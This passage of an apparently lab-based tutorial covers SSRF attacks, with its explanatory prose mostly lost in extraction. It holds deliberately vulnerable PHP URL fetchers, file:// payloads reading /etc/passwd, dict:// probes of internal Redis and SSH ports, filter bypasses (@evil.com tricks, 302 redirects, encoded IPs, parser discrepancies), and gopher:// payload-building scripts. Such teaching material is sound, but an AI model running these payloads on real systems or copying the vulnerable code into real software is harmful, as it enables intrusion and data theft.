SOAP</p>\n</li>\n</ul>\n<p>SSRFPayloadnulllocationurilocationtarget_url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;, &#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;));  </span><br><span class=\"line\">$b = serialize($a);  </span><br><span class=\"line\">echo $b;  </span><br><span class=\"line\">$c = unserialize($b);  </span><br><span class=\"line\">$c-&gt;a();    // , \\_\\_callssrf  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>47.xxx.xxx.722333ssrf.php47.xxx.xxx.72</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small\"\n                        alt=\"image-20210112234821125\"\n                 ></p>\n<p>ssrf</p>\n<p>http&#x2F;httpshttpcrlfssrf+crlfhttp<a class=\"link\"   href=\"https://www.anquanke.com/post/id/202025\" >SoapClient+crlfSSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>SSRF</p>\n<ul>\n<li><p>file  file </p>\n</li>\n<li><p>dictredis</p>\n</li>\n<li><p>gophergopherGETPOSTgetpostgophergopherssrf()shell</p>\n</li>\n<li><p>http&#x2F;s</p>\n</li>\n</ul>\n<p></p>\n<h2 id=\"filehttp-sdict\"><a href=\"#filehttp-sdict\" class=\"headerlink\" title=\"filehttp&#x2F;sdict\"></a>filehttp&#x2F;sdict</h2><p>SSRF</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); //  cURL </span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL </span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); //  URL </span><br><span class=\"line\">\tcurl\\_close($curlobj); //  cURL </span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<h3 id=\"file\"><a href=\"#file\" class=\"headerlink\" title=\"file\"></a>file</h3><p>payload</p>\n<p>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small\"\n                        alt=\"image-20210113000529370\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg\"\n                        alt=\"image-20210113000640979\"\n                 ></p>\n<h3 id=\"http-s\"><a href=\"#http-s\" class=\"headerlink\" title=\"http&#x2F;s\"></a>http&#x2F;s</h3><p>&#x2F;etc&#x2F;hosts&#x2F;proc&#x2F;net&#x2F;arp&#x2F;proc&#x2F;net&#x2F;fib_trie</p>\n<p>IPIPIP</p>\n<ul>\n<li><p>C192.168.0.0 - 192.168.255.255</p>\n</li>\n<li><p>B172.16.0.0 - 172.31.255.255</p>\n</li>\n<li><p>A10.0.0.0 - 10.255.255.255</p>\n</li>\n</ul>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg\"\n                        alt=\"image-20210113190506825\"\n                 ></p>\n<p>WEBUbuntuSSRFpayloadUbuntu</p>\n<p>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.1/\" >http://192.168.52.1<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.6/\" >http://192.168.52.6<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.25/\" >http://192.168.52.25<i class=\"fas fa-external-link-alt\"></i></a><br></p>\n<p>burpsuiteIntruder</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small\"\n                        alt=\"image-20210113120505690\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg\"\n                        alt=\"image-20210113120551977\"\n                 ></p>\n<p>192.168.52.130192.168.52.131</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small\"\n                        alt=\"image-20210113120806794\"\n                 ></p>\n<h3 id=\"http-sdict\"><a href=\"#http-sdict\" class=\"headerlink\" title=\"http&#x2F;sdict\"></a>http&#x2F;sdict</h3><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small\"\n                        alt=\"image-20210113190455756\"\n                 ></p>\n<p>dictpayload</p>\n<p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:6379&#x2F;info   &#x2F;&#x2F; redis<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:80&#x2F;info     &#x2F;&#x2F; http<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.130:22&#x2F;info   &#x2F;&#x2F; ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg\"\n                        alt=\"image-20210113190244954\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg\"\n                        alt=\"image-20210113122530377\"\n                 ></p>\n<p>burpsuite</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>SSRF</p>\n<ul>\n<li><p>WebHTTPHTTPS</p>\n</li>\n<li><p><a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n</li>\n<li><p>IP</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h3 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h3><p> <a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a>HTTP@<a class=\"link\"   href=\"http://www.evil.com/\" >http:&#x2F;&#x2F;www.xxx.com@www.evil.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"302IP\"><a href=\"#302IP\" class=\"headerlink\" title=\"302IP\"></a>302IP</h3><p>ip<strong>302</strong></p>\n<p>1 <a class=\"link\"   href=\"http://xip.io/\" >http://xip.io<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://127.0.0.1.xip.io/flag.php\" >http://127.0.0.1.xip.io/flag.php<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://127.0.0.1/1.php\" >http://127.0.0.1/1.php<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://nip.io/\" >http://nip.io<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://sslip.io/\" >http://sslip.io<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small\"\n                        alt=\"image-20210113124813254\"\n                 ></p>\n<p>2 <a class=\"link\"   href=\"https://4m.cn/\" >https://4m.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg\"\n                        alt=\"image-20201027163528110\"\n                 ></p>\n<p> <a class=\"link\"   href=\"https://4m.cn/FjOdQ\" >https://4m.cn/FjOdQ<i class=\"fas fa-external-link-alt\"></i></a>302 <a class=\"link\"   href=\"http://127.0.0.1/flag.php\" >http://127.0.0.1/flag.php<i class=\"fas fa-external-link-alt\"></i></a>WAF</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small\"\n                        alt=\"image-20210113124727560\"\n                 ></p>\n<h3 id=\"IP\"><a href=\"#IP\" class=\"headerlink\" title=\"IP\"></a>IP</h3><p>ipWAFphp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$ip = &#x27;127.0.0.1&#x27;;  </span><br><span class=\"line\">$ip = explode(&#x27;.&#x27;,$ip);  </span><br><span class=\"line\">$r = ($ip\\[0\\] &lt;&lt; 24) | ($ip\\[1\\] &lt;&lt; 16) | ($ip\\[2\\] &lt;&lt; 8) | $ip\\[3\\] ;  </span><br><span class=\"line\">if($r &lt; 0) &#123;  </span><br><span class=\"line\">$r += 4294967296;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo &quot;:&quot;;     // 2130706433  </span><br><span class=\"line\">echo $r;  </span><br><span class=\"line\">echo &quot;:&quot;;     // 0177.0.0.1  </span><br><span class=\"line\">echo decoct($r);  </span><br><span class=\"line\">echo &quot;:&quot;;   // 0x7f.0.0.1  </span><br><span class=\"line\">echo dechex($r);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"127-0-0-1\"><a href=\"#127-0-0-1\" class=\"headerlink\" title=\"127.0.0.1\"></a>127.0.0.1</h3><p><a class=\"link\"   href=\"http://localhost/\" >http://localhost/<i class=\"fas fa-external-link-alt\"></i></a>         # localhost127.0.0.1<br><a class=\"link\"   href=\"http://0.0.0.0/\" >http://0/<i class=\"fas fa-external-link-alt\"></i></a>                 # 0window0.0.0.0liunx127.0.0.1<br>http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;    # liunxwindow<br>http:&#x2F;&#x2F;[::]:80&#x2F;           # liunxwindow<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127001/<i class=\"fas fa-external-link-alt\"></i></a>       # <br>http:&#x2F;&#x2F;...<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.1/<i class=\"fas fa-external-link-alt\"></i></a><br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.00000.00000.001/<i class=\"fas fa-external-link-alt\"></i></a> # 0127.0.0.1</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><code>file_get_contents()</code>PHP<code>file_get_contents()</code>include()</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);  </span><br><span class=\"line\">if(!preg\\_match(&#x27;/^https/is&#x27;,$\\_GET\\[&#x27;url&#x27;\\]))&#123;  </span><br><span class=\"line\">die(&quot;no hack&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo file\\_get\\_contents($\\_GET\\[&#x27;url&#x27;\\]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>urlhttps</p>\n<p>httpsssss:&#x2F;&#x2F;</p>\n<p><code>file_get_contents()</code>httpsssss:&#x2F;&#x2F;</p>\n<p>ssrf.php?url&#x3D;httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small\"\n                        alt=\"image-20210113130534208\"\n                 ></p>\n<p>SSRF</p>\n<h3 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h3><p>Orange Tsai2017 BlackHat <a class=\"link\"   href=\"https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\" >A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages<i class=\"fas fa-external-link-alt\"></i></a>readfileparse_urlcurlparse_url</p>\n<p><strong>1readfileparse_url</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &#x27;http://&#x27;. $\\_GET\\[url\\];</span><br><span class=\"line\">$parsed = parse\\_url($url);</span><br><span class=\"line\">if( $parsed\\[port\\] == 80 )&#123;  // url80</span><br><span class=\"line\">\treadfile($url);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">\tdie(&#x27;Hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>python11211WEB</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg\"\n                        alt=\"image-20210113133210683\"\n                 ></p>\n<p>url8011211</p>\n<p>ssrf.php?url&#x3D;127.0.0.1:11211:80&#x2F;flag.txt</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg\"\n                        alt=\"image-20210113133242461\"\n                 ></p>\n<p>11211flag.txtBlackHat</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                        alt=\"1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                 ></p>\n<p>readfile()11211parse_url()80WAF</p>\n<p>host</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                        alt=\"1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                 ></p>\n<p>readfile()@evil.comparse_url()@google.comparse_url()host</p>\n<p><strong>2curlparse_urlhost</strong></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg\"\n                        alt=\"1610601386_5fffd3aa565a51587d90c.png!small?1610601386867\"\n                 ></p>\n<p>curl()@parse_url()@parse_url()host</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">function check\\_inner\\_ip($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $match\\_result=preg\\_match(&#x27;/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/&#x27;,$url);</span><br><span class=\"line\">    if (!$match\\_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    try</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url\\_parse=parse\\_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url\\_parse\\[&#x27;host&#x27;\\];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int\\_ip=ip2long($ip);</span><br><span class=\"line\">    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int\\_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int\\_ip&gt;&gt;16;// ip</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function safe\\_request\\_url($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (check\\_inner\\_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $url.&#x27; is inner ip&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl\\_init();</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_URL, $url);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);</span><br><span class=\"line\">        $output = curl\\_exec($ch);</span><br><span class=\"line\">        $result\\_info = curl\\_getinfo($ch);</span><br><span class=\"line\">        if ($result\\_info\\[&#x27;redirect\\_url&#x27;\\])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe\\_request\\_url($result\\_info\\[&#x27;redirect\\_url&#x27;\\]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl\\_close($ch);</span><br><span class=\"line\">        var\\_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">if(!empty($url))&#123;</span><br><span class=\"line\">    safe\\_request\\_url($url);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>check_inner_ip</code><code>url_parse()</code>IP IP <code>curl()</code> url curlparse_url<code>parse_url()</code><code>curl()</code>paylaod</p>\n<p>ssrf.php?url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:<a class=\"link\"   href=\"mailto:&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;\" >&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;<i class=\"fas fa-external-link-alt\"></i></a>&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg\"\n                        alt=\"image-20210113134443846\"\n                 ></p>\n<p> <a class=\"link\"   href=\"https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5\" >[2020 ]doyouknowssrf<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h2 id=\"Gopher\"><a href=\"#Gopher\" class=\"headerlink\" title=\"Gopher\"></a>Gopher</h2><h3 id=\"GopherSSRF\"><a href=\"#GopherSSRF\" class=\"headerlink\" title=\"GopherSSRF\"></a>GopherSSRF</h3><p>GopherInternetInternetInternetWWWGopherInternetGopherTCP 70WWWGopher</p>\n<p>GopherSSRFSSRFGopherGETPOSTGETPOSTGopherpayloadSSRFRedisMySqlFastCGISSRF</p>\n<p><strong>1Gopher</strong></p>\n<p>URL: gopher:&#x2F;&#x2F;<host>:<port>&#x2F;<gopher-path>_TCP  </p>\n<p># __TCP_</p>\n<ul>\n<li><p>gopher70</p>\n</li>\n<li><p>POST<code>%0d%0a</code><code>%0a</code>&amp;URL</p>\n</li>\n</ul>\n<blockquote>\n<p>GopherHTTPGETHTTPgopherHTTP</p>\n<ol>\n<li><p>HTTP</p>\n</li>\n<li><p>URL<code>%0a</code><code>%0d%0a</code></p>\n</li>\n<li><p>gopher</p>\n</li>\n</ol>\n</blockquote>\n<p><strong>2GopherHTTP GET</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_GET\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payloadGETHTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br></pre></td></tr></table></figure>\n\n<p>Gopherpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse  </span><br><span class=\"line\">payload =\\\\  </span><br><span class=\"line\">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1  </span><br><span class=\"line\">Host: 47.xxx.xxx.72  </span><br><span class=\"line\">&quot;&quot;&quot;    </span><br></pre></td></tr></table></figure>\n\n<p># http  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)  </span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)  </span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new  </span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small\"\n                        alt=\"image-20210113170748727\"\n                 ></p>\n<blockquote>\n<p><strong></strong></p>\n<ol>\n<li><p>?URL%3f</p>\n</li>\n<li><p>%0d%0a,%0a</p>\n</li>\n<li><p>HTTP%0d%0aHTTP</p>\n</li>\n</ol>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg\"\n                        alt=\"image-20210113171043970\"\n                 ></p>\n<p>GETHello Bunny</p>\n<p><strong>3GopherHTTP POST</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// echo.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">echo &quot;Hello &quot;.$\\_POST\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payloadPOSTHTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br></pre></td></tr></table></figure>\n\n<p><strong>HTTPPOSTPOSTHostContent-TypeContent-LengthGETContent-Lengthwhoami&#x3D;Bunny</strong></p>\n<p>POSTURLgopher</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">payload =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class=\"line\">Host: 47.xxx.xxx.72</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 12</span><br><span class=\"line\"></span><br><span class=\"line\">whoami=Bunny</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"http\"><a href=\"#http\" class=\"headerlink\" title=\"http\"></a>http</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(payload)</span><br><span 